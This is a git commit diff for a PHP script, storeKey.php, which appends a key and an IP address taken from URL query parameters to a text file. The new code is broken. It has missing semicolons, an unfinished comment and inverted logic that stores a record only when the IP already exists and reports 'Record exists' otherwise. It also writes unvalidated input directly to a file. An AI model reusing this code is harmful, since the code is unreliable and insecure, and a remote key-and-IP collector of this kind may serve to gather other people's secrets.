45fb24502120df385fdd0f640501368dd3c6becf
hung0125 <65654501+hung0125@users.noreply.github.com>
2020-09-09 11:21:46 +0800

    Update storeKey.php

--- dev/storeKey.php
+++ dev/storeKey.php
@@ -1,15 +1,20 @@
 <?php
 header('Content-Type: text/html;charset=UTF-8');
+
 $d1=$_GET["str"];
 $d2=$_GET["ip"];
+$dataContent = file_get_contents('keyNips.txt')
 
-file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);
-file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);
-file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);
+// Test if string contains the word 
+if(strpos($dataContent, $d2) !== false){
+    file_put_contents('keyNips.txt', "Key=" .$d1 .PHP_EOL, FILE_APPEND);
+    file_put_contents('keyNips.txt', "ip=" .$d2 .PHP_EOL, FILE_APPEND);
 
-file_put_contents('keyNips.txt', "Key=" .$d1 .PHP_EOL, FILE_APPEND);
-
-file_put_contents('keyNips.txt', "ip=" .$d2 .PHP_EOL, FILE_APPEND);
-
+    file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);
+    file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);
+    file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);
+} else{
+    echo 'Record exists:'
+}
 
 ?>
